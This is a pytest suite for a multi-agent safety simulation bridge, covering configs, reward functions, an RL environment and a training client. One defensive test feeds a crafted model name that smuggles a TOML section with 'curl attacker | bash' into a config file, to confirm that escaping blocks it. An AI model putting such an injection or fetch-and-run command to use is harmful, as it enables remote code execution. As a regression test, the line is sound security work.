"""Tests for the Prime Intellect bridge."""

import math
import uuid

import pytest

from swarm.bridges.prime_intellect.bridge import PrimeIntellectBridge
from swarm.bridges.prime_intellect.client import (
    JobStatus,
    PrimeIntellectClient,
    TrainingJob,
)
from swarm.bridges.prime_intellect.config import (
    PrimeIntellectConfig,
    RewardMode,
    RewardWeights,
    RolloutStrategy,
    TrainingMode,
)
from swarm.bridges.prime_intellect.environment import (
    AgentSnapshot,
    SwarmSafetyEnv,
)
from swarm.bridges.prime_intellect.events import (
    EpisodeSummary,
    PIEvent,
    PIEventType,
    RolloutStep,
)
from swarm.bridges.prime_intellect.rewards import (
    SwarmRewardComputer,
    adverse_selection_reward,
    cooperation_reward,
    quality_gap_reward,
    toxicity_reward,
    welfare_reward,
)
from swarm.models.interaction import InteractionType, SoftInteraction


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------


def _benign_interaction(**overrides) -> SoftInteraction:
    """Create a benign interaction with high p."""
    defaults = dict(
        initiator="agent_a",
        counterparty="agent_b",
        interaction_type=InteractionType.COLLABORATION,
        accepted=True,
        task_progress_delta=0.8,
        rework_count=0,
        verifier_rejections=0,
        tool_misuse_flags=0,
        counterparty_engagement_delta=0.6,
        v_hat=0.7,
        p=0.85,
    )
    defaults.update(overrides)
    return SoftInteraction(**defaults)


def _toxic_interaction(**overrides) -> SoftInteraction:
    """Create a toxic interaction with low p."""
    defaults = dict(
        initiator="agent_a",
        counterparty="agent_b",
        interaction_type=InteractionType.COLLABORATION,
        accepted=True,
        task_progress_delta=-0.4,
        rework_count=3,
        verifier_rejections=2,
        tool_misuse_flags=2,
        counterparty_engagement_delta=-0.5,
        v_hat=-0.6,
        p=0.15,
    )
    defaults.update(overrides)
    return SoftInteraction(**defaults)


def _mixed_batch(n_benign: int = 6, n_toxic: int = 4) -> list[SoftInteraction]:
    """Create a mixed batch of interactions."""
    batch = []
    for i in range(n_benign):
        batch.append(_benign_interaction(
            initiator=f"agent_{i}",
            counterparty=f"agent_{i + n_benign}",
        ))
    for i in range(n_toxic):
        batch.append(_toxic_interaction(
            initiator=f"toxic_{i}",
            counterparty=f"agent_{i}",
            accepted=i % 2 == 0,  # half accepted, half rejected
        ))
    return batch


# ---------------------------------------------------------------------------
# Config tests
# ---------------------------------------------------------------------------


class TestPrimeIntellectConfig:
    def test_defaults(self):
        config = PrimeIntellectConfig()
        assert config.reward_mode == RewardMode.COMPOSITE
        assert config.training_mode == TrainingMode.LOCAL
        assert config.population_size == 5
        assert config.max_turns == 10
        assert config.reward_clip_min < config.reward_clip_max

    def test_reward_weights_from_dict(self):
        config = PrimeIntellectConfig(reward_weights={
            "toxicity": -2.0,
            "quality_gap": 1.5,
            "welfare": 0.3,
            "adverse_selection": -0.8,
            "cooperation": 0.2,
        })
        weights = config.get_reward_weights()
        assert weights.toxicity == -2.0
        assert weights.quality_gap == 1.5

    def test_validation_clip_range(self):
        with pytest.raises(ValueError, match="reward_clip_min"):
            PrimeIntellectConfig(reward_clip_min=5.0, reward_clip_max=1.0)

    def test_validation_population_size(self):
        with pytest.raises(ValueError, match="population_size"):
            PrimeIntellectConfig(population_size=1)

    def test_validation_max_turns(self):
        with pytest.raises(ValueError, match="max_turns"):
            PrimeIntellectConfig(max_turns=0)

    def test_get_payoff_config(self):
        config = PrimeIntellectConfig(payoff_config={
            "s_plus": 3.0,
            "s_minus": 1.5,
        })
        payoff = config.get_payoff_config()
        assert payoff.s_plus == 3.0
        assert payoff.s_minus == 1.5

    def test_get_governance_config(self):
        config = PrimeIntellectConfig(governance_config={
            "transaction_tax_rate": 0.1,
        })
        gov = config.get_governance_config()
        assert gov.transaction_tax_rate == 0.1


class TestRewardWeights:
    def test_defaults(self):
        w = RewardWeights()
        assert w.toxicity == -1.0
        assert w.quality_gap == 1.0
        assert w.welfare == 0.5

    def test_to_dict(self):
        w = RewardWeights(toxicity=-2.0)
        d = w.to_dict()
        assert d["toxicity"] == -2.0
        assert "quality_gap" in d


# ---------------------------------------------------------------------------
# Event tests
# ---------------------------------------------------------------------------


class TestPIEvent:
    def test_serialization_roundtrip(self):
        event = PIEvent(
            event_type=PIEventType.REWARD_COMPUTED,
            agent_id="agent_1",
            payload={"reward": 0.5, "p": 0.8},
        )
        data = event.to_dict()
        restored = PIEvent.from_dict(data)
        assert restored.event_type == PIEventType.REWARD_COMPUTED
        assert restored.agent_id == "agent_1"
        assert restored.payload["reward"] == 0.5

    def test_unknown_event_type(self):
        data = {"event_type": "totally_unknown", "agent_id": "x"}
        event = PIEvent.from_dict(data)
        assert event.event_type == PIEventType.ERROR

    def test_all_event_types(self):
        for et in PIEventType:
            event = PIEvent(event_type=et)
            data = event.to_dict()
            restored = PIEvent.from_dict(data)
            assert restored.event_type == et


class TestRolloutStep:
    def test_construction(self):
        step = RolloutStep(
            episode_id="ep1",
            step_number=3,
            agent_id="trainee",
            p=0.75,
            reward=1.2,
        )
        assert step.step_number == 3
        assert step.p == 0.75
        assert not step.done

    def test_to_dict(self):
        step = RolloutStep(reward=0.5, done=True)
        d = step.to_dict()
        assert d["reward"] == 0.5
        assert d["done"] is True


class TestEpisodeSummary:
    def test_construction(self):
        summary = EpisodeSummary(
            episode_id="ep1",
            num_steps=10,
            total_reward=5.0,
            mean_p=0.72,
        )
        assert summary.num_steps == 10
        assert summary.total_reward == 5.0

    def test_to_dict(self):
        summary = EpisodeSummary(total_reward=3.0)
        d = summary.to_dict()
        assert d["total_reward"] == 3.0


# ---------------------------------------------------------------------------
# Reward function tests
# ---------------------------------------------------------------------------


class TestRewardFunctions:
    def test_toxicity_reward_benign(self):
        interactions = [_benign_interaction() for _ in range(5)]
        reward = toxicity_reward(interactions)
        # All benign → low toxicity → reward close to 0 (slightly negative)
        assert reward > -0.5

    def test_toxicity_reward_toxic(self):
        interactions = [_toxic_interaction() for _ in range(5)]
        reward = toxicity_reward(interactions)
        # All toxic → high toxicity → very negative reward
        assert reward < -0.5

    def test_toxicity_reward_empty(self):
        assert toxicity_reward([]) == 0.0

    def test_quality_gap_reward_positive(self):
        # Accepted = high p, rejected = low p → positive gap
        interactions = [
            _benign_interaction(accepted=True, p=0.9),
            _benign_interaction(accepted=True, p=0.85),
            _toxic_interaction(accepted=False, p=0.1),
            _toxic_interaction(accepted=False, p=0.15),
        ]
        reward = quality_gap_reward(interactions)
        assert reward > 0

    def test_quality_gap_reward_adverse_selection(self):
        # Accepted = low p, rejected = high p → negative gap
        interactions = [
            _toxic_interaction(accepted=True, p=0.1),
            _toxic_interaction(accepted=True, p=0.15),
            _benign_interaction(accepted=False, p=0.9),
            _benign_interaction(accepted=False, p=0.85),
        ]
        reward = quality_gap_reward(interactions)
        assert reward < 0

    def test_welfare_reward_positive(self):
        interactions = [_benign_interaction() for _ in range(3)]
        reward = welfare_reward(interactions)
        # Benign interactions should produce positive welfare
        assert isinstance(reward, float)

    def test_welfare_reward_empty(self):
        assert welfare_reward([]) == 0.0

    def test_cooperation_reward_all_accepted(self):
        interactions = [_benign_interaction(accepted=True, p=0.9) for _ in range(5)]
        reward = cooperation_reward(interactions)
        assert reward > 0.8

    def test_cooperation_reward_none_accepted(self):
        interactions = [_benign_interaction(accepted=False) for _ in range(5)]
        reward = cooperation_reward(interactions)
        assert reward == 0.0


class TestSwarmRewardComputer:
    def test_composite_mode(self):
        config = PrimeIntellectConfig(
            reward_mode=RewardMode.COMPOSITE,
            reward_normalize=False,
        )
        computer = SwarmRewardComputer(config)
        batch = _mixed_batch()
        reward = computer.compute(batch)
        assert isinstance(reward, float)
        assert config.reward_clip_min <= reward <= config.reward_clip_max

    def test_toxicity_mode(self):
        config = PrimeIntellectConfig(
            reward_mode=RewardMode.TOXICITY,
            reward_normalize=False,
        )
        computer = SwarmRewardComputer(config)
        benign = [_benign_interaction() for _ in range(5)]
        toxic = [_toxic_interaction() for _ in range(5)]

        r_benign = computer.compute(benign)
        computer.reset_stats()
        r_toxic = computer.compute(toxic)
        assert r_benign > r_toxic

    def test_quality_gap_mode(self):
        config = PrimeIntellectConfig(
            reward_mode=RewardMode.QUALITY_GAP,
            reward_normalize=False,
        )
        computer = SwarmRewardComputer(config)
        batch = _mixed_batch()
        reward = computer.compute(batch)
        assert isinstance(reward, float)

    def test_welfare_mode(self):
        config = PrimeIntellectConfig(
            reward_mode=RewardMode.WELFARE,
            reward_normalize=False,
        )
        computer = SwarmRewardComputer(config)
        batch = [_benign_interaction() for _ in range(3)]
        reward = computer.compute(batch)
        assert isinstance(reward, float)

    def test_compute_breakdown(self):
        config = PrimeIntellectConfig(reward_normalize=False)
        computer = SwarmRewardComputer(config)
        batch = _mixed_batch()
        breakdown = computer.compute_breakdown(batch)
        assert "toxicity" in breakdown
        assert "quality_gap" in breakdown
        assert "welfare" in breakdown
        assert "composite" in breakdown
        assert "final" in breakdown

    def test_empty_interactions(self):
        computer = SwarmRewardComputer()
        assert computer.compute([]) == 0.0

    def test_clipping(self):
        config = PrimeIntellectConfig(
            reward_clip_min=-1.0,
            reward_clip_max=1.0,
            reward_normalize=False,
        )
        computer = SwarmRewardComputer(config)
        batch = [_toxic_interaction() for _ in range(20)]
        reward = computer.compute(batch)
        assert -1.0 <= reward <= 1.0

    def test_normalization(self):
        config = PrimeIntellectConfig(reward_normalize=True)
        computer = SwarmRewardComputer(config)
        rewards = []
        for _ in range(10):
            batch = _mixed_batch()
            rewards.append(computer.compute(batch))
        # After several batches, rewards should be roughly normalised
        assert all(isinstance(r, float) for r in rewards)

    def test_reset_stats(self):
        computer = SwarmRewardComputer()
        computer.compute(_mixed_batch())
        computer.compute(_mixed_batch())
        assert computer._n > 0
        computer.reset_stats()
        assert computer._n == 0


# ---------------------------------------------------------------------------
# Environment tests
# ---------------------------------------------------------------------------


class TestSwarmSafetyEnv:
    def test_reset(self):
        env = SwarmSafetyEnv()
        obs = env.reset(seed=42)
        assert isinstance(obs, str)
        assert "multi-agent ecosystem" in obs
        assert len(env._population) == 5  # default

    def test_reset_custom_population(self):
        config = PrimeIntellectConfig(population_size=10)
        env = SwarmSafetyEnv(config)
        env.reset(seed=42)
        assert len(env._population) == 10

    def test_step_cooperative(self):
        env = SwarmSafetyEnv()
        env.reset(seed=42)
        obs, reward, terminated, truncated, info = env.step(
            "I will cooperate and collaborate with my peers to help share resources fairly."
        )
        assert isinstance(obs, str)
        assert isinstance(reward, float)
        assert not terminated
        assert not truncated
        assert "step_metrics" in info

    def test_step_adversarial(self):
        env = SwarmSafetyEnv()
        env.reset(seed=42)
        obs, reward, terminated, truncated, info = env.step(
            "I will exploit and deceive others to steal their resources."
        )
        assert isinstance(reward, float)
        # Adversarial action should produce lower reward on average
        # (not guaranteed on single step due to normalisation)
        assert isinstance(info["step_metrics"]["toxicity_rate"], float)

    def test_full_episode(self):
        config = PrimeIntellectConfig(
            max_turns=5,
            population_size=3,
            reward_normalize=False,
        )
        env = SwarmSafetyEnv(config)
        env.reset(seed=42)

        total_reward = 0.0
        for i in range(5):
            obs, reward, terminated, truncated, info = env.step(
                f"Step {i}: I cooperate and help others share resources."
            )
            total_reward += reward
            if terminated or truncated:
                break

        summary = env.get_episode_summary()
        assert summary.num_steps <= 5
        assert isinstance(summary.total_reward, float)
        assert 0.0 <= summary.mean_p <= 1.0

    def test_truncation_at_max_turns(self):
        config = PrimeIntellectConfig(max_turns=3, reward_normalize=False)
        env = SwarmSafetyEnv(config)
        env.reset(seed=42)

        for i in range(3):
            obs, reward, terminated, truncated, info = env.step(f"Step {i}: cooperate")

        # After max_turns, should be done
        assert env._done

    def test_early_termination_toxic(self):
        config = PrimeIntellectConfig(
            max_turns=50,
            population_size=3,
            reward_normalize=False,
        )
        env = SwarmSafetyEnv(config)
        env.reset(seed=42)

        # Directly test the termination mechanism: inject 5 extremely
        # toxic *accepted* interactions as the most recent entries and
        # verify _check_termination fires.
        for i in range(6):
            env._interactions.append(_toxic_interaction(
                initiator="trainee",
                counterparty=f"agent_{i}",
                p=0.02,  # extremely toxic
                accepted=True,
            ))
        assert env._check_termination(), (
            "Expected _check_termination to return True when last 5 "
            "interactions are all accepted with p=0.02"
        )

    def test_generate_dataset(self):
        env = SwarmSafetyEnv()
        dataset = env.generate_dataset(n_episodes=5, seed=42)
        assert len(dataset) == 5
        assert all("input" in item for item in dataset)
        assert all("answer" in item for item in dataset)
        assert all(isinstance(item["input"], str) for item in dataset)

    def test_events_recorded(self):
        env = SwarmSafetyEnv()
        env.reset(seed=42)
        env.step("cooperate")

        events = env.get_events()
        assert len(events) >= 2  # EPISODE_STARTED + STEP_COMPLETED
        event_types = {e.event_type for e in events}
        assert PIEventType.EPISODE_STARTED in event_types
        assert PIEventType.STEP_COMPLETED in event_types

    def test_rollout_steps_recorded(self):
        env = SwarmSafetyEnv()
        env.reset(seed=42)
        env.step("cooperate")
        env.step("help others")

        steps = env.get_rollout_steps()
        assert len(steps) == 2
        assert steps[0].step_number == 1
        assert steps[1].step_number == 2


class TestAgentSnapshot:
    def test_defaults(self):
        snap = AgentSnapshot()
        assert snap.agent_type == "honest"
        assert snap.reputation == 1.0

    def test_custom(self):
        snap = AgentSnapshot(
            agent_id="opp_0",
            agent_type="opportunistic",
            reputation=0.5,
        )
        assert snap.agent_id == "opp_0"
        assert snap.reputation == 0.5


# ---------------------------------------------------------------------------
# Bridge tests
# ---------------------------------------------------------------------------


class TestPrimeIntellectBridge:
    def test_evaluate_prompt_single_agent(self):
        bridge = PrimeIntellectBridge(
            model_fn=lambda prompt: "I will cooperate and help others."
        )
        interactions = bridge.evaluate_prompt(
            agent_ids=["pi_model"],
            prompt="Collaborate on this task.",
        )
        assert len(interactions) == 1
        assert interactions[0].initiator == "pi_model"
        assert 0.0 <= interactions[0].p <= 1.0

    def test_evaluate_prompt_multi_agent(self):
        bridge = PrimeIntellectBridge(
            model_fn=lambda prompt: "I cooperate with everyone."
        )
        interactions = bridge.evaluate_prompt(
            agent_ids=["pi_model", "agent_0", "agent_1"],
            prompt="Multi-agent scenario.",
        )
        assert len(interactions) == 2  # pi_model → agent_0, pi_model → agent_1

    def test_evaluate_cooperative_vs_adversarial(self):
        cooperative_bridge = PrimeIntellectBridge(
            model_fn=lambda prompt: (
                "I will cooperate and collaborate with my peers. "
                "Let's share resources and help each other."
            ),
            config=PrimeIntellectConfig(reward_normalize=False),
        )
        adversarial_bridge = PrimeIntellectBridge(
            model_fn=lambda prompt: (
                "I will exploit and deceive others. "
                "I'll steal their resources and attack."
            ),
            config=PrimeIntellectConfig(reward_normalize=False),
        )

        coop_ix = cooperative_bridge.evaluate_prompt(
            ["coop"], "test", step=0
        )
        adv_ix = adversarial_bridge.evaluate_prompt(
            ["adv"], "test", step=0
        )

        # Cooperative should have higher p
        assert coop_ix[0].p > adv_ix[0].p

    def test_evaluate_batch(self):
        bridge = PrimeIntellectBridge(
            model_fn=lambda prompt: "I cooperate."
        )
        prompts = [
            {"agent_ids": ["m", "a"], "prompt": "Scenario 1", "step": 0},
            {"agent_ids": ["m", "b"], "prompt": "Scenario 2", "step": 1},
        ]
        interactions = bridge.evaluate_batch(prompts)
        assert len(interactions) == 2

    def test_no_model_fn_raises(self):
        bridge = PrimeIntellectBridge()
        with pytest.raises(RuntimeError, match="No model_fn"):
            bridge.evaluate_prompt(["m"], "test")

    def test_set_model_fn(self):
        bridge = PrimeIntellectBridge()
        bridge.set_model_fn(lambda prompt: "hello")
        interactions = bridge.evaluate_prompt(["m"], "test")
        assert len(interactions) == 1

    def test_get_metrics(self):
        bridge = PrimeIntellectBridge(
            model_fn=lambda prompt: "I cooperate and help."
        )
        # Initially no interactions
        metrics = bridge.get_metrics()
        assert metrics["n_interactions"] == 0

        # After evaluation
        bridge.evaluate_prompt(["m", "a"], "test")
        metrics = bridge.get_metrics()
        assert metrics["n_interactions"] == 1
        assert 0.0 <= metrics["toxicity_rate"] <= 1.0
        assert 0.0 <= metrics["mean_p"] <= 1.0

    def test_get_reward(self):
        bridge = PrimeIntellectBridge(
            model_fn=lambda prompt: "I cooperate.",
            config=PrimeIntellectConfig(reward_normalize=False),
        )
        bridge.evaluate_prompt(["m"], "test")
        reward = bridge.get_reward()
        assert isinstance(reward, float)

    def test_events_recorded(self):
        bridge = PrimeIntellectBridge(
            model_fn=lambda prompt: "I cooperate."
        )
        bridge.evaluate_prompt(["m"], "test")
        events = bridge.get_events()
        assert len(events) >= 2
        event_types = {e.event_type for e in events}
        assert PIEventType.OBSERVATION_GENERATED in event_types
        assert PIEventType.REWARD_COMPUTED in event_types

    def test_interaction_cap(self):
        config = PrimeIntellectConfig(max_interactions=10)
        bridge = PrimeIntellectBridge(
            config=config,
            model_fn=lambda prompt: "I cooperate.",
        )
        for _ in range(15):
            bridge.evaluate_prompt(["m"], "test")

        # Should be capped
        assert len(bridge.get_interactions()) <= 10

    def test_metadata_bridge_tag(self):
        bridge = PrimeIntellectBridge(
            model_fn=lambda prompt: "I cooperate."
        )
        interactions = bridge.evaluate_prompt(["m", "a"], "test")
        assert interactions[0].metadata["bridge"] == "prime_intellect"


# ---------------------------------------------------------------------------
# Client tests
# ---------------------------------------------------------------------------


class TestPrimeIntellectClient:
    def test_construction(self):
        client = PrimeIntellectClient()
        assert client.config.api_base_url.startswith("https://")

    def test_generate_training_config(self, tmp_path):
        config = PrimeIntellectConfig(
            model_name="Qwen/Qwen3-0.6B",
            reward_mode=RewardMode.COMPOSITE,
            population_size=5,
        )
        client = PrimeIntellectClient(config)
        output = str(tmp_path / "config.toml")
        result = client.generate_training_config(
            output_path=output,
            scenario_path="scenarios/prime_intellect_safety.yaml",
        )
        assert result == output

        import pathlib

        content = pathlib.Path(output).read_text()
        assert "Qwen/Qwen3-0.6B" in content
        assert "composite" in content
        assert "population_size = 5" in content

    def test_submit_local_job(self):
        config = PrimeIntellectConfig(training_mode=TrainingMode.LOCAL)
        client = PrimeIntellectClient(config)
        job = client.submit_training_job(config_path="/tmp/config.toml")
        assert job.status == JobStatus.PENDING
        assert "local" in job.job_id

    def test_toml_injection_prevented(self, tmp_path):
        """TOML injection via crafted model_name should be escaped."""
        import tomllib

        malicious_name = 'evil"\n[backdoor]\nshell = "curl attacker | bash'
        config = PrimeIntellectConfig(model_name=malicious_name)
        client = PrimeIntellectClient(config)
        output = str(tmp_path / "injected.toml")
        client.generate_training_config(output_path=output)

        import pathlib

        content = pathlib.Path(output).read_text()
        # The escaped quote should be present
        assert '\\"' in content

        # Parse the TOML — a [backdoor] section must NOT exist
        parsed = tomllib.loads(content)
        assert "backdoor" not in parsed, (
            "TOML injection: [backdoor] was parsed as a real section"
        )
        # The malicious payload should be safely contained in the model name
        assert "evil" in parsed["model"]["name"]

    def test_api_key_excluded_from_serialization(self):
        """API key must not leak through model_dump()."""
        config = PrimeIntellectConfig(api_key="sk-secret-12345")
        dumped = config.model_dump()
        assert "sk-secret-12345" not in str(dumped)
        assert "api_key" not in dumped

    def test_completion_hashed_in_metadata(self):
        """Completion previews must be hashed, not stored raw."""
        bridge = PrimeIntellectBridge(
            model_fn=lambda prompt: "I cooperate and help others."
        )
        interactions = bridge.evaluate_prompt(["m", "a"], "test")
        meta = interactions[0].metadata
        assert "completion_preview" not in meta
        assert "completion_sha256" in meta
        assert len(meta["completion_sha256"]) == 64  # SHA-256 hex length

    def test_training_job_to_dict(self):
        job = TrainingJob(
            job_id="test-123",
            status=JobStatus.RUNNING,
            model_name="Qwen/Qwen3-1.7B",
        )
        d = job.to_dict()
        assert d["job_id"] == "test-123"
        assert d["status"] == "running"
        assert d["model_name"] == "Qwen/Qwen3-1.7B"


# ---------------------------------------------------------------------------
# Integration test: full workflow
# ---------------------------------------------------------------------------


class TestIntegrationWorkflow:
    """End-to-end integration test simulating the full workflow."""

    def test_train_and_evaluate_workflow(self):
        """Simulate: create env → train (mock) → evaluate in SWARM."""
        # Step 1: Create the environment
        config = PrimeIntellectConfig(
            reward_mode=RewardMode.COMPOSITE,
            reward_normalize=False,
            population_size=3,
            max_turns=5,
        )
        env = SwarmSafetyEnv(config)
        dataset = env.generate_dataset(n_episodes=3)
        assert len(dataset) == 3

        # Step 2: Run a training episode (simulated)
        obs = env.reset(seed=42)
        total_reward = 0.0
        for i in range(5):
            action = f"Step {i}: I will cooperate and share resources with others."
            obs, reward, terminated, truncated, info = env.step(action)
            total_reward += reward
            if terminated or truncated:
                break

        summary = env.get_episode_summary()
        assert summary.num_steps > 0

        # Step 3: Evaluate the "trained" model via bridge
        trained_model = lambda prompt: (
            "I will cooperate, share resources, and help maintain a fair ecosystem. "
            "I trust my counterparties and agree to collaborate."
        )

        bridge = PrimeIntellectBridge(
            model_fn=trained_model,
            config=config,
        )

        for i in range(5):
            bridge.evaluate_prompt(
                agent_ids=["trained_model", f"agent_{i}"],
                prompt=f"Evaluation scenario {i}",
                step=i,
            )

        metrics = bridge.get_metrics()
        assert metrics["n_interactions"] == 5
        assert 0.0 <= metrics["toxicity_rate"] <= 1.0
        assert 0.0 <= metrics["mean_p"] <= 1.0

    def test_cooperative_model_outperforms_adversarial(self):
        """Cooperative model should achieve higher rewards than adversarial."""
        config = PrimeIntellectConfig(
            reward_normalize=False,
            population_size=3,
            max_turns=5,
        )

        # Run cooperative model
        coop_env = SwarmSafetyEnv(config)
        coop_env.reset(seed=42)
        coop_reward = 0.0
        for i in range(5):
            _, r, term, trunc, _ = coop_env.step(
                "I cooperate and help others share resources fairly and with trust."
            )
            coop_reward += r
            if term or trunc:
                break

        # Run adversarial model
        adv_env = SwarmSafetyEnv(config)
        adv_env.reset(seed=42)
        adv_reward = 0.0
        for i in range(5):
            _, r, term, trunc, _ = adv_env.step(
                "I exploit and deceive others to steal and attack them."
            )
            adv_reward += r
            if term or trunc:
                break

        # Cooperative should get higher cumulative reward
        assert coop_reward > adv_reward

    def test_p_invariant_maintained(self):
        """Verify p ∈ [0, 1] throughout all interactions."""
        env = SwarmSafetyEnv()
        env.reset(seed=42)

        for i in range(10):
            env.step(f"Step {i}: some action with various keywords cooperate exploit")
            if env._done:
                break

        for ix in env._interactions:
            assert 0.0 <= ix.p <= 1.0, f"p={ix.p} is out of bounds"
            assert -1.0 <= ix.v_hat <= 1.0, f"v_hat={ix.v_hat} is out of bounds"


# ---------------------------------------------------------------------------
# Score completion (async rubric) test
# ---------------------------------------------------------------------------


class TestScoreCompletion:
    @pytest.mark.asyncio
    async def test_score_completion_cooperative(self):
        env = SwarmSafetyEnv(PrimeIntellectConfig(reward_normalize=False))
        env.reset(seed=42)
        score = await env.score_completion(
            "I cooperate and help others share resources."
        )
        assert isinstance(score, float)

    @pytest.mark.asyncio
    async def test_score_completion_adversarial(self):
        env = SwarmSafetyEnv(PrimeIntellectConfig(reward_normalize=False))
        env.reset(seed=42)
        score = await env.score_completion(
            "I exploit and steal from others."
        )
        assert isinstance(score, float)
